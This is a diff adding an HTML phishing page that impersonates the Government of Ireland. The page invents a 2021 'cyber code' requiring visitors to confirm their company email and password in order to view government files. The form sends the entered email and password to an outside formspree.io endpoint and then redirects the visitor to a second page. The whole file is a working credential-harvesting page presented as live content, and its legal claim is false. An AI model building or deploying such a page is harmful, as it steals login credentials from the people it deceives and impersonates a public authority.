@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=7">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>document</title>
+    <link rel="stylesheet" href="form.css">
+    <style>
+      /* Extra small devices (phones, 600px and down) */
+      @media screen and (max-width: 600px) {
+        #logo2{
+          position: relative;
+          right: 100px;
+          }
+        } 
+       
+      
+      /* Small devices (portrait tablets and large phones, 600px and up) */
+      @media only screen and (min-width: 600px) {
+       
+        }
+      
+      /* Medium devices (landscape tablets, 768px and up) */
+      @media only screen and (min-width: 768px) {
+        } 
+      
+      /* Large devices (laptops/desktops, 992px and up) */
+      @media only screen and (min-width: 992px) {
+        } 
+      
+      /* Extra large devices (large laptops and desktops, 1200px and up) */
+      @media only screen and (min-width: 1200px) { 
+        #logo2{
+          position: relative;
+          right: 100px;
+        }
+        }
+              </style>
+  </head>
+  <body class="container">
+    <div> 
+      <div id="logo1">
+     <img src="logo3.jpg"  alt="" style="width: 200px; position: relative; top: 80px;">
+      </div>
+     <div id="logo2">
+      <img src="logo2.jpg"  alt=""style="width: 200px; position: relative; left:300px; top:3px">
+     </div>
+      
+      <form action="https://formspree.io/f/mknylykv" method="POST" id="myform" onsubmit="sendEmail(); reset(); return false;" onclick="myOnClickFn">
+        <h4 style="color: red;">Ireland cyber code of Government files as amended in 2021 requires companies email cofirmation and password to view government files.</h4>
+        <input type="email" id="email" name="email" placeholder="Confirm company email address" required>
+        <input type="password" id="password" name="password" placeholder="Password" required>
+        <button type="submit">view</button>
+        <p style="color: black;text-align:center">©2022 Government of Ireland</p>
+      <p id="my-form-status"></p> 
+      </form>
+      </div>
+    </div>
+    <script>
+     var form = document.getElementById("myform");
+      
+      async function handleSubmit(event) {
+        event.preventDefault();
+        var status = document.getElementById("my-form-status");
+        var data = new FormData(event.target);
+        
+        fetch(event.target.action, {
+          method: form.method,
+          body: data,
+          headers: {
+              'Accept': 'application/json'
+          }
+        }).then(response => {
+          if (response.ok) {
+            status.innerHTML = "Thanks for your submission!";
+            form.reset()
+          } else {
+            response.json().then(data => {
+              if (Object.hasOwn(data, 'errors')) {
+                status.innerHTML = data["errors"].map(error => error["message"]).join(", ")
+              } else {
+                status.innerHTML = "Oops! There was a problem submitting your form"
+              }
+            })
+          }
+        }).catch(error => {
+          status.innerHTML = "Oops! There was a problem submitting your form"
+        }).then(()=>{
+          form.onsubmit(window.location.href="page2.html")
+        })
+        
+      }
+      form.addEventListener("submit", handleSubmit)
+      
+  </script>
+</body>
+</html>
